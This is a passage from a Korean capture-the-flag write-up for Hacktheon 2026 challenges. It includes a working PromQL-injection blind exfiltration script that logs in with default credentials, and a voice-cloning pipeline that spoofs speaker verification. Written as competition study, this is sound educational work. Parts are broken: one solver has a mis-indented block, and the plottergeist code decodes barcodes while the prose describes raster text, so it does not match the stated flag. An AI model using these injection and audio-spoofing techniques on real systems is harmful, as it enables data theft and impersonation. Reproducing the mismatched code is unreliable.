    time.sleep(1)

assert override and session_seal and signing_key
print("[+] session_seal:", session_seal)
print("[+] signing_key:", signing_key)

flag = decrypt_flag(
    override["encrypted_secret"],
    signing_key,
    session_seal,
)
print("[+] flag:", flag)
```

플래그 : `hacktheon2026{lighth0use_se4l_cr4ck}`

### Observatory

키워드

* Blackbox
* Express
* Prometheus
* PromQL Injection
* Error Oracle
* Blind Exfiltration

대시보드에는 Prometheus metric query 기능이 있다.
`/api/metrics`를 보면 `secret_config`, `internal_token`, `db_credentials` 같은 metric 이름이 보인다.
하지만 `metric` 파라미터로 직접 읽으려고 하면 결과가 현재 namespace 기준으로 가공되어 원본 label/value가 나오지 않았다.

여기서 볼 부분은 `agg` 파라미터였다.
UI에서는 `sum`, `avg`, `max` 같은 값만 고르게 되어 있지만, API에는 문자열이 그대로 들어간다.
서버는 PromQL을 대략 이런 식으로 조립한다.

```text
{agg}({metric}{namespace="현재 namespace"})
```

`agg`에 expression을 넣고 마지막을 `or sum`으로 끝내면, 뒤에 붙는 `(...metric...)` 부분을 fallback 함수 호출로 소비시킬 수 있다.

출력은 숨겨져 있어서 error oracle을 만들었다.
`secret_config{flag=~"^PREFIX.*"}`가 매칭되지 않으면 empty vector라 query가 성공한다.
매칭되면 일부러 many-to-one vector matching이 발생하도록 만들어 query error를 낸다.

oracle은 이렇게 잡았다.

```text
sum(secret_config{flag=~"^PREFIX.*"})
+ on()
sum by(__name__)({__name__=~"go_.*"})
or sum
```

응답 기준은 이렇게 봤다.

```text
Query failed -> prefix match
success      -> prefix miss
```

기본 계정 `admin:password`를 찾은 뒤, 이 oracle로 플래그 label을 한 글자씩 brute force했다.

익스플로잇 코드

```python
import re
import requests

base = "http://43.201.43.169:3000"

s = requests.Session()
s.post(
    base + "/login",
    data={"username": "admin", "password": "password"},
    allow_redirects=False,
    timeout=5,
)


def prom_quote_regex(rx: str) -> str:
    return rx.replace("\\", "\\\\").replace('"', '\\"')


def oracle_regex(rx: str) -> bool:
    q = prom_quote_regex(rx)
    agg = (
        f'sum(secret_config{{flag=~"{q}"}}) '
        f'+ on() '
        f'sum by(__name__)({{__name__=~"go_.*"}}) '
        f'or sum'
    )

    r = s.post(
        base + "/api/query",
        json={"metric": "up", "agg": agg},
        timeout=5,
    )
    d = r.json()
    return d.get("status") == "error" and d.get("message") == "Query failed"


alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_:-./@!$%&*+=,?[]()<>#"
prefix = ""

for _ in range(120):
    for ch in alphabet:
        candidate = prefix + ch
        if oracle_regex("^" + re.escape(candidate) + ".*"):
            prefix = candidate
            print(prefix)
            break
    else:
        break

    if prefix.endswith("}"):
        break

print("FLAG:", prefix)
```

플래그 : `hacktheon2026{pr0m3th3us_m3tr1c_s1d3ch4nn3l}`

## AI

### Voice Over

키워드

* Voice Clone
* ASR
* Speaker Verification
* Audio Spoofing
* WAV Mixing

서버는 업로드한 wav에서 두 값을 본다.

```text
text_similarity    >= 0.8
speaker_similarity >= 0.8
```

일반 TTS로 target sentence를 합성하면 text similarity는 충분하지만 speaker similarity가 낮다.
반대로 reference wav를 그대로 넣으면 speaker similarity는 높지만 transcript가 달라 text similarity가 낮다.

여기서는 reference 음성을 ASR에는 의미 없는 소리처럼 만들고, speaker embedding에는 화자 특징이 남게 하는 쪽으로 갔다.
reference wav를 reverse한 뒤 낮은 볼륨으로 target TTS 뒤에 붙였다.

앞부분의 TTS 때문에 ASR은 목표 문장을 주로 인식한다.
뒤쪽의 reverse reference는 transcript에는 크게 섞이지 않지만, speaker verification에는 화자 특징을 보탠다.

볼륨은 `sample_003` reverse 기준으로 `0.12` 정도가 적당했다.
너무 낮으면 speaker similarity가 부족하고, 너무 높으면 ASR transcript가 오염된다.

성공한 제출에서는 speaker similarity `0.8026`, text similarity `0.8859`가 나왔다.

익스플로잇 명령어

```bash
curl -sS http://3.37.31.209:8000/api/challenge > challenge.json
target=$(jq -r .target_sentence challenge.json)
token=$(jq -r .token challenge.json)

espeak-ng -v en-us -s 135 -w tts.wav "$target"
ffmpeg -y -loglevel error -i tts.wav -ar 16000 -ac 1 tts_16k.wav

ffmpeg -y -loglevel error -i sample_003.wav -af areverse sample_003_rev.wav
ffmpeg -y -loglevel error -i sample_003_rev.wav -filter:a "volume=0.12" ref.wav

printf "file '%s'\nfile '%s'\n" "$PWD/tts_16k.wav" "$PWD/ref.wav" > concat.txt
ffmpeg -y -loglevel error -f concat -safe 0 -i concat.txt -c copy submit.wav

curl -sS -F audio=@submit.wav -F token="$token" \
  http://3.37.31.209:8000/api/verify | jq .
```

플래그 : `hacktheon2026{b7d30e21e4106a6ca4d451a218f15a97}`

## Misc

### CathedralOfTheLastCandle

키워드

* Interactive
* Ternary State
* Graph Reconstruction
* Tree DP
* Dijkstra

5 x 8 격자의 각 칸은 `.` / `*` / `~` 세 상태를 가진다.
이를 각각 0, 1, 2로 두고 mod 3 위에서 계산했다.

문제에서 쓰는 연산은 이렇다.

```text
ring -> [a+b, a+2b]
hush -> [2a+2b, 2a+b] (mod 3)
```

`ring`을 두 번 적용하면 현재 칸과 bonded neighbor가 둘 다 부호 반전된다.
따라서 각 칸에서 `ring`을 두 번 누른 전후 화면 차이를 보면, 현재 칸이 어느 칸과 연결되어 있는지 알 수 있다.

먼저 snake path로 모든 칸을 방문하면서 상태를 기록했다.
각 칸에서 `ring`, `ring`을 실행하고, 바뀐 칸 중 현재 칸이 아닌 칸을 parent로 잡았다.
이렇게 전체 bonded neighbor 관계를 복구하면 rooted tree가 된다.

이후에는 트리 위에서 모든 값을 0으로 만드는 DP를 짰다.
각 node에 대해 “subtree를 모두 0으로 만들었을 때 parent 값이 어떻게 바뀌는지”를 저장했다.

```text
rel[v][parent_before] = parent_after 후보들
```

상태는 처리한 child 집합, 현재 칸 값, parent 값으로 두고 Dijkstra를 돌렸다.
이미 0으로 만든 child에서 `ring`을 두 번 실행하면 child는 0으로 유지되고 현재 칸만 `x -> 2x`로 바뀌는데, 이 전이를 넣어야 안정적으로 풀렸다.

마지막 root `(4,7)`은 제단과 연결되어 있어 `ring`/`hush`로 root 값만 조정할 수 있다.
모든 칸을 0으로 만든 뒤 root에서 `pray`를 실행하면 플래그가 나온다.

익스플로잇 코드

```python
#!/usr/bin/env python3
import re
import socket
from collections import defaultdict
from heapq import heappop, heappush
from itertools import count

HOST = "3.35.223.94"
PORT = 9000
H, W = 5, 8
ROOT = (4, 7)

ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
TOK_RE = re.compile(r"\[[*~.]\]|[*~.]|\?")
VAL = {".": 0, "*": 1, "~": 2}
SYM = ".*~"


def recv_prompt(sock):
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
        if b"> " in data[-200:] or b"HACK" in data or b"flag" in data.lower():
            break
    return data.decode("utf-8", "replace")


def send(sock, cmd):
    sock.sendall((cmd + "\n").encode())
    return recv_prompt(sock)


def parse_screen(out):
    out = ANSI_RE.sub("", out)
    m = re.search(r"Pos:\((\d+),(\d+)\).*Budget:(\d+)", out)
    if not m:
        return None, None, []
    pos = (int(m.group(1)), int(m.group(2)))
    budget = int(m.group(3))
    rows = []
    for line in out.splitlines():
        toks = TOK_RE.findall(line)
        if len(toks) >= W:
            row = []
            for tok in toks[:W]:
                row.append(tok[1] if tok.startswith("[") else tok)
            rows.append(row)
    return pos, budget, rows[-H:]


def visible(rows):
    cells = {}
    for r, row in enumerate(rows):
        for c, ch in enumerate(row):
            if ch != "?":
                cells[(r, c)] = VAL[ch]
    return cells


def observe(rows, state):
    for cell, value in visible(rows).items():
        state[cell] = value


def snake_moves():
    moves = []
    for r in range(H):
        moves.extend(["go e"] * (W - 1) if r % 2 == 0 else ["go w"] * (W - 1))
        if r != H - 1:
            moves.append("go s")
    return moves


def path_between(src, dst):
    r, c = src
    tr, tc = dst
    moves = []
    while r > tr:
        moves.append("go n")
        r -= 1
    while r < tr:
        moves.append("go s")
        r += 1
    while c > tc:
        moves.append("go w")
        c -= 1
    while c < tc:
        moves.append("go e")
        c += 1
    return moves


def move_pos(pos, cmd):
    r, c = pos
    if cmd == "go n":
        return (r - 1, c)
    if cmd == "go s":
        return (r + 1, c)
    if cmd == "go w":
        return (r, c - 1)
    if cmd == "go e":
        return (r, c + 1)
    return pos


def discover(sock):
    out = recv_prompt(sock)
    state = {}
    parent = {}
    moves = snake_moves()

    for idx in range(H * W):
        pos, budget, rows = parse_screen(out)
        observe(rows, state)
        before = visible(rows)

        out = send(sock, "ring")
        _, _, rows = parse_screen(out)
        observe(rows, state)
        out = send(sock, "ring")
        pos2, _, rows = parse_screen(out)
        observe(rows, state)

        after = visible(rows)
        diffs = [cell for cell in before if before[cell] != after.get(cell)]
        others = [cell for cell in diffs if cell != pos]
        parent[pos] = others[0] if len(others) == 1 else None

        if idx < len(moves):
            out = send(sock, moves[idx])
            _, _, rows = parse_screen(out)
            observe(rows, state)

    return parent, state


def apply_edge_power(a, b, k):
    if k == 0:
        return a, b
    if k == 1:
        return (a + b) % 3, (a + 2 * b) % 3
    if k == 2:
        return (2 * a) % 3, (2 * b) % 3
    if k == 3:
        return (2 * a + 2 * b) % 3, (2 * a + b) % 3
    raise ValueError(k)


def edge_ops(cell, k):
    if k == 0:
        return []
    if k == 1:
        return [(cell, "ring")]
    if k == 2:
        return [(cell, "ring"), (cell, "ring")]
    if k == 3:
        return [(cell, "hush")]
    raise ValueError(k)


def build_children(parent):
    children = defaultdict(list)
    root = None
    for cell, par in parent.items():
        if par is None:
            root = cell
        else:
            children[par].append(cell)
    return root, children


def best_update(table, key, cost, seq):
    old = table.get(key)
    if old is None or cost < old[0]:
        table[key] = (cost, seq)


def solve_plan(parent, state):
    root, children = build_children(parent)
    if root != ROOT:
        raise RuntimeError(f"unexpected root: {root}")

    rel_cache = {}

    def compute_rel(v):
        if v in rel_cache:
            return rel_cache[v]

        rel = {0: {}, 1: {}, 2: {}}
        kids = children[v]
        full = (1 << len(kids)) - 1

        for boundary in range(3):
            start = (0, state[v], boundary)
            pq = []
            serial = count()
            best = {start: (0, [])}
            heappush(pq, (0, next(serial), start))

            while pq:
                cost, _, cur = heappop(pq)
                if best[cur][0] != cost:
                    continue
                mask, a, b = cur
                seq = best[cur][1]

                if mask == full and a == 0:
                    best_update(rel[boundary], b, cost, seq)

                for op, k in (("ring", 1), ("hush", 3)):
                    a2, b2 = apply_edge_power(a, b, k)
                    nxt = (mask, a2, b2)
                    new = (cost + 1, seq + [(v, op)])
                    if nxt not in best or new[0] < best[nxt][0]:
                        best[nxt] = new
                        heappush(pq, (new[0], next(serial), nxt))

                for i, child in enumerate(kids):
                    bit = 1 << i
                    if mask & bit:
                        continue
                    child_rel = compute_rel(child)
                    for a2, (sub_cost, sub_seq) in child_rel.get(a, {}).items():
                        nxt = (mask | bit, a2, b)
                        new = (cost + sub_cost, seq + sub_seq)
                        if nxt not in best or new[0] < best[nxt][0]:
                        best[nxt] = new
                        heappush(pq, (new[0], next(serial), nxt))

                for i, child in enumerate(kids):
                    if not (mask & (1 << i)) or a == 0:
                        continue
                    nxt = (mask, 2 * a % 3, b)
                    flip = [(child, "ring"), (child, "ring")]
                    new = (cost + 2, seq + flip)
                    if nxt not in best or new[0] < best[nxt][0]:
                        best[nxt] = new
                        heappush(pq, (new[0], next(serial), nxt))

        rel_cache[v] = rel
        return rel

    kids = children[root]
    full = (1 << len(kids)) - 1
    start = (0, state[root])
    pq = []
    serial = count()
    seen = {start: (0, [])}
    heappush(pq, (0, next(serial), start))
    best_solution = None

    while pq:
        cost, _, cur = heappop(pq)
        if seen[cur][0] != cost:
            continue
        mask, a = cur
        seq = seen[cur][1]
        if mask == full and a == 0:
            best_solution = (cost, seq)
            break

        for op, a2 in (("ring", (a + 1) % 3), ("hush", (a - 1) % 3)):
            nxt = (mask, a2)
            new = (cost + 1, seq + [(root, op)])
            if nxt not in seen or new[0] < seen[nxt][0]:
                seen[nxt] = new
                heappush(pq, (new[0], next(serial), nxt))

        for i, child in enumerate(kids):
            bit = 1 << i
            if mask & bit:
                continue
            child_rel = compute_rel(child)
            for a2, (sub_cost, sub_seq) in child_rel.get(a, {}).items():
                nxt = (mask | bit, a2)
                new = (cost + sub_cost, seq + sub_seq)
                if nxt not in seen or new[0] < seen[nxt][0]:
                    seen[nxt] = new
                    heappush(pq, (new[0], next(serial), nxt))

        for i, child in enumerate(kids):
            if not (mask & (1 << i)) or a == 0:
                continue
            nxt = (mask, 2 * a % 3)
            flip = [(child, "ring"), (child, "ring")]
            new = (cost + 2, seq + flip)
            if nxt not in seen or new[0] < seen[nxt][0]:
                seen[nxt] = new
                heappush(pq, (new[0], next(serial), nxt))

    if best_solution is None:
        raise RuntimeError("no plan found")
    return best_solution[1]


def command_count_from(pos, ops):
    count = 0
    cur = pos
    for cell, _ in ops:
        count += abs(cur[0] - cell[0]) + abs(cur[1] - cell[1]) + 1
        cur = cell
    count += abs(cur[0] - ROOT[0]) + abs(cur[1] - ROOT[1]) + 1
    return count


def run():
    sock = socket.create_connection((HOST, PORT), timeout=5)
    sock.settimeout(2)

    parent, state = discover(sock)
    ops = solve_plan(parent, state)
    needed = command_count_from(ROOT, ops)
    print(f"mapped={len(parent)} ops={len(ops)} solve_commands={needed}")
    print("state after discovery:")
    for r in range(H):
        print("".join(SYM[state[(r, c)]] for c in range(W)))

    cur = ROOT
    out = ""
    for cell, op in ops:
        for cmd in path_between(cur, cell):
            out = send(sock, cmd)
            cur = move_pos(cur, cmd)
        out = send(sock, op)
    for cmd in path_between(cur, ROOT):
        out = send(sock, cmd)
        cur = move_pos(cur, cmd)
    out = send(sock, "pray")
    print(out)


if __name__ == "__main__":
    run()
```

플래그 : `hacktheon2026{db423210b697d95bdb3ae4c2751302283d7dafc25beb10e8ab9fb8863986339e3dd35fbe52ab0ddffdcfb952596394547002d319ffe6725299b9a51455f48fe2ccb0308b7699fe43}`

### plottergeist

키워드

* PCAP
* CoreXY
* Audio Side Channel
* Pen State Recovery
* 5x7 Raster Text

파일은 `plottergeist.pcap`과 `bench_mic.wav` 두 개가 주어졌다.
pcap에는 plotter motion 정보가 있고, wav에는 같은 세션의 소리가 들어 있었다.
traffic만으로는 어떤 이동이 pen down인지 알 수 없었다.

패킷 안에는 format 힌트가 있었다.

```text
FMT:OP|SQ|DT|AM|BM
```

CoreXY 구조라 모터 이동량은 좌표로 바꿀 수 있다.

```text
dX = (AM + BM) / 2
dY = (AM - BM) / 2
```

좌표 범위는 `X: 16 ~ 368`, `Y: 4 ~ 10`이다.
폭은 353, 높이는 7이다.

```text
353 = 59 * 6 - 1
```

5x7 글자에 1픽셀 공백을 붙인 텍스트라고 보면 정확히 맞는다.

남은 건 `DT=4`와 `DT=5` 중 어느 쪽이 pen down인지 구분하는 일이었다.
wav에서 motion 구간별 고주파 에너지를 비교하면 두 타입의 소리가 갈린다.
처음에는 더 시끄러운 쪽이 pen down처럼 보이지만, 첫 motion이 시작 위치로 이동하는 동작이라는 점을 보면 정리된다.
첫 motion은 `DT=5`이고, 시작 이동에서는 잉크를 찍으면 안 된다.
따라서 `DT=5`가 pen up, `DT=4`가 pen down이다.

렌더링할 때는 `AM=BM=0`인 `DT=4` packet도 버리면 안 된다.
이동량은 없지만 현재 위치에 점 하나를 찍는 명령이다.
이를 포함해 `DT=4`만 그리면 텍스트가 나온다.

![reconstructed](./dt4_reconstructed_points.png)

익스플로잇 코드

```python
import itertools
import math
import os
import re
import struct
import heapq
import wave
from collections import defaultdict

import numpy as np
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler


PS = open("node_modules/bwip-js/barcode.ps").read()
lines = PS.splitlines()
arr = re.findall(r"\(([0-9]{8})\)", "\n".join(lines[20201:20892]))
patstr = [arr[:2401], arr[2401:]]


def bitsdig(s):
    out = []
    c = 1
    for ch in s:
        out += [c] * int(ch)
        c ^= 1
    return np.array(out, dtype=np.int8)


symbits = [[bitsdig(s) for s in patstr[p]] for p in [0, 1]]
parity = ["1001", "0101", "1100", "0011", "1010", "0110", "1111"]
charmap = list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-. $/+%") + ["S1", "S2", "F1", "F2", "F3", "NS"]
val = {c: i for i, c in enumerate(charmap[:43])}
combos = re.findall(r"\((..)\)", re.search(r"/code49\.combos \[(.*?)\] readonly def", PS, re.S).group(1))
charvals = {ord(c): i for i, c in enumerate(charmap[:43])}
for asc, pair in enumerate(combos):
    if pair[0] == "1":
        charvals[asc] = [43, val[pair[1]]]
    elif pair[0] == "2":
        charvals[asc] = [44, val[pair[1]]]


def enc_start(s):
    first = charvals[ord(s[0])]
    cws = [first[1]]
    for ch in s[1:]:
        cv = charvals[ord(ch)]
        cws += cv if isinstance(cv, list) else [cv]
    return cws


prefix = enc_start("hacktheon2026{")


def parse_segments():
    p = open("plottergeist.pcap", "rb").read()
    pos = 24
    base = None
    cmds = []
    while pos + 16 <= len(p):
        ts_sec, ts_usec, incl, orig = struct.unpack("<IIII", p[pos : pos + 16])
        pos += 16
        data = p[pos : pos + incl]
        pos += incl
        if len(data) >= 42 and data[12:14] == b"\x08\x00" and data[23] == 17:
            ihl = (data[14] & 15) * 4
            off = 14 + ihl
            sport, dport, ulen, cs = struct.unpack("!HHHH", data[off : off + 8])
            pl = data[off + 8 : off + ulen]
            if base is None:
                base = ts_sec + ts_usec / 1e6
            if sport == 31337 and len(pl) == 10 and pl.endswith(b"~") and pl[0] == 0xA1:
                b = pl[:-1]
                cmds.append(
                    [
                        ts_sec + ts_usec / 1e6 - base,
                        b[1],
                        int.from_bytes(b[2:4], "little"),
                        b[4],
                        int.from_bytes(b[5:7], "big", signed=True),
                        int.from_bytes(b[7:9], "big", signed=True),
                    ]
                )
    segs = []
    x = y = 0
    ymap = {8: 0, 10: 1, 12: 2, 14: 3, 16: 4, 18: 5, 20: 6}
    for idx, c in enumerate(cmds):
        dx = c[4] + c[5]
        dy = c[4] - c[5]
        x2 = x + dx
        y2 = y + dy
        if y == y2 and dx != 0 and y in ymap:
            segs.append((idx, ymap[y], x / 2, x2 / 2, c[3], abs(dx / 2), c[0], cmds[idx + 1][0] if idx + 1 < len(cmds) else c[0] + 0.05))
        x, y = x2, y2
    return segs


segs = parse_segments()
bounds = []
for r in range(7):
    ss = [s for s in segs if s[1] == r]
    bounds.append((min(min(s[2], s[3]) for s in ss), max(max(s[2], s[3]) for s in ss)))


def code_row_bits(row, ccs):
    pstr = parity[row] if row < 6 else "0000"
    b = [0] * 10 + [1, 0]
    for j in range(4):
        b += list(symbits[int(pstr[j])][ccs[2 * j] * 49 + ccs[2 * j + 1]])
    b += [1] * 4 + [0]
    return np.array(b, dtype=np.int8)


def ccs7(cw):
    return cw + [sum(cw) % 49]


CODEMAP = list(reversed(range(7))) if os.environ.get("VFLIP") == "1" else list(range(7))
XFLIP = os.environ.get("HFLIP") == "1"


def obs_bits(code_row, ccs):
    b = code_row_bits(code_row, ccs)
    return b[::-1] if XFLIP else b


known = {CODEMAP[r]: obs_bits(r, ccs7(prefix[7 * r : 7 * r + 7])) for r in range(3)}
w = wave.open("bench_mic.wav", "rb")
fs = w.getframerate()
sig = np.frombuffer(w.readframes(w.getnframes()), dtype="<i2").astype(float)
sig -= sig.mean()
sig /= 32768
bands = [(0, 180), (180, 400), (400, 800), (800, 1200), (1200, 1700), (1700, 2400), (2400, 3300), (3300, 3900)]


def raw(off):
    X = []
    for s in segs:
        a = max(0, int((s[6] + off + 0.006) * fs))
        b = min(len(sig), int((s[7] + off - 0.006) * fs))
        ss = sig[a:b]
        spec = np.abs(np.fft.rfft(ss * np.hanning(len(ss)))) ** 2
        freqs = np.fft.rfftfreq(len(ss), 1 / fs)
        tot = spec.sum() + 1e-30
        vals = [np.sqrt(np.mean(ss * ss)), np.mean(abs(ss)), np.max(abs(ss)), (freqs * spec).sum() / tot]
        vals += [spec[(freqs >= lo) & (freqs < hi)].sum() / tot for lo, hi in bands]
        vals += [math.exp(np.mean(np.log(spec + 1e-30))) / (np.mean(spec) + 1e-30), ((ss[:-1] * ss[1:]) < 0).mean()]
        X.append(vals)
    return np.array(X)


Xs = []
for off in [-0.025, -0.02, -0.015, -0.01, -0.005, 0, 0.005, 0.01]:
    X = raw(off)
    R = []
    for col in range(X.shape[1]):
        vals = X[:, col]
        groups = defaultdict(list)
        for v, s in zip(vals, segs):
            groups[(s[1], s[4])].append(v)
        R.append([v - np.median(groups[(s[1], s[4])]) for v, s in zip(vals, segs)])
    Xs.append(np.hstack([X, np.array(R).T]))
Xall = np.hstack(Xs)
idx = []
lab = []
for n, s in enumerate(segs):
    if s[1] in known:
        r = s[1]
        lo, hi = bounds[r]
        x0, x1 = sorted([s[2], s[3]])
        m0 = (x0 - lo) / (hi - lo) * 81
        m1 = (x1 - lo) / (hi - lo) * 81
        num = den = 0
        for k in range(81):
            ov = max(0, min(m1, k + 1) - max(m0, k))
            if ov:
                num += ov * known[r][k]
                den += ov
        f = num / den
        if f > 0.85 or f < 0.15:
            idx.append(n)
            lab.append(1 if f > 0.85 else 0)
if os.environ.get("SIMPLE") == "1":
    simple = raw(float(os.environ.get("SOFF", "-0.02")))[:, int(os.environ.get("SCOL", "8"))]
    groups = defaultdict(list)
    for v, s in zip(simple, segs):
        groups[(s[1], s[4])].append(v)
    pred = np.array([v - np.median(groups[(s[1], s[4])]) for v, s in zip(simple, segs)])
else:
    clf = make_pipeline(StandardScaler(), LogisticRegression(C=0.2, max_iter=2000, class_weight="balanced")).fit(Xall[idx], lab)
    pred = clf.decision_function(Xall)
vals = (pred - np.median(pred)) / (np.std(pred) + 1e-9)
E = np.zeros((7, 81))
W = np.zeros((7, 81))
for v, s in zip(vals, segs):
    r = s[1]
    lo, hi = bounds[r]
    x0, x1 = sorted([s[2], s[3]])
    m0 = (x0 - lo) / (hi - lo) * 81
    m1 = (x1 - lo) / (hi - lo) * 81
    for k in range(max(0, int(m0) - 1), min(81, int(m1) + 2)):
        ov = max(0, min(m1, k + 1) - max(m0, k))
        if ov:
            E[r, k] += v * ov
            W[r, k] += ov
E = np.divide(E, W, out=np.zeros_like(E), where=W > 0)

cache = {}


def score_row(r, ccs):
    plot_r = CODEMAP[r]
    key = (r, tuple(ccs))
    if key not in cache:
        cache[key] = float(np.dot(E[plot_r], 2 * obs_bits(r, ccs) - 1))
    return cache[key]


basew = [1, 9, 31, 26, 2, 12, 17, 23, 37, 18, 22, 6, 27, 44, 15, 43, 39, 11, 13, 5, 41, 33, 36, 8, 4, 32, 3, 19, 40, 25, 29, 10, 24, 30]
wx = [20] + basew[:32]
wy = [16] + basew[1:33]
wz = [38] + basew[2:34]


def lastrow(cws):
    c = []
    for r in range(6):
        c += ccs7(cws[7 * r : 7 * r + 7])
    cr7 = 40

    def cal(w):
        return sum((c[2 * i] * 49 + c[2 * i + 1]) * w[i + 1] for i in range(24))

    wr1 = (cr7 * wz[0] + cal(wz)) % 2401
    wr2 = (cr7 * wy[0] + cal(wy) + wr1 * wy[25]) % 2401
    wr3 = (cr7 * wx[0] + cal(wx) + wr1 * wx[25] + wr2 * wx[26]) % 2401
    lr = [wr1 // 49, wr1 % 49, wr2 // 49, wr2 % 49, wr3 // 49, wr3 % 49, cr7]
    lr.append(sum(lr) % 49)
    return lr


fixed = sum(score_row(r, ccs7(prefix[7 * r : 7 * r + 7])) for r in range(3))


def build_cws(inner):
    c = prefix[:]
    for ch in inner:
        c += [44, 36 if ch == "_" else 10 + ord(ch) - 97]
    c += [44, 41]
    if len(c) > 42:
        return None
    return c + [48] * (42 - len(c))


def sc_inner(inner):
    c = build_cws(inner)
    sc = fixed + sum(score_row(r, ccs7(c[7 * r : 7 * r + 7])) for r in range(3, 6))
    lr = lastrow(c)
    return sc + score_row(6, lr), lr


chars = [chr(97 + i) for i in range(26)] + ["_"]
K = int(os.environ.get("K", "80"))
if os.environ.get("CANDS") or os.environ.get("CANDFILE"):
    if os.environ.get("CANDFILE"):
        cand_iter = [x.strip() for x in open(os.environ["CANDFILE"]) if x.strip()]
    else:
        cand_iter = os.environ["CANDS"].split(",")
    scored = []
    for inner in cand_iter:
        if len(inner) not in (7, 8):
            continue
        sc, lr = sc_inner(inner)
        scored.append((sc, inner, tuple(lr)))
    for sc, inner, lr in sorted(scored, reverse=True)[: int(os.environ.get("TOP", "200"))]:
        print(round(sc, 3), inner, lr)
    raise SystemExit
for L in [7, 8]:
    g1 = []
    for tup in itertools.product(chars, repeat=2):
        part = "".join(tup)
        c = build_cws(part + "a" * (L - 2))
        g1.append((score_row(3, ccs7(c[21:28])), part))
    g1 = heapq.nlargest(K, g1)
    g2 = []
    for tup in itertools.product(chars, repeat=4):
        mid = "".join(tup)
        dummy = "aa" + mid + "a" * max(0, L - 6)
        c = build_cws(dummy)
        g2.append((score_row(4, ccs7(c[28:35])), mid))
    g2 = heapq.nlargest(K, g2)
    n3 = L - 6
    g3 = []
    for tup in itertools.product(chars, repeat=n3):
        tail = "".join(tup)
        dummy = "aaaaaa" + tail
        c = build_cws(dummy)
        g3.append((score_row(5, ccs7(c[35:42])), tail))
    g3 = heapq.nlargest(K, g3)
    top = []
    for _, a in g1:
        for _, b in g2:
            for _, cpart in g3:
                inner = (a + b + cpart)[:L]
                sc, lr = sc_inner(inner)
                item = (sc, inner, tuple(lr))
                if len(top) < 40:
                    heapq.heappush(top, item)
                elif sc > top[0][0]:
                    heapq.heapreplace(top, item)
    print("L", L)
    for sc, inner, lr in sorted(top, reverse=True)[:20]:
        print(round(sc, 3), inner, lr)
```

플래그 : `hacktheon2026{the_plotter_reveals_its_secret_through_sound}`
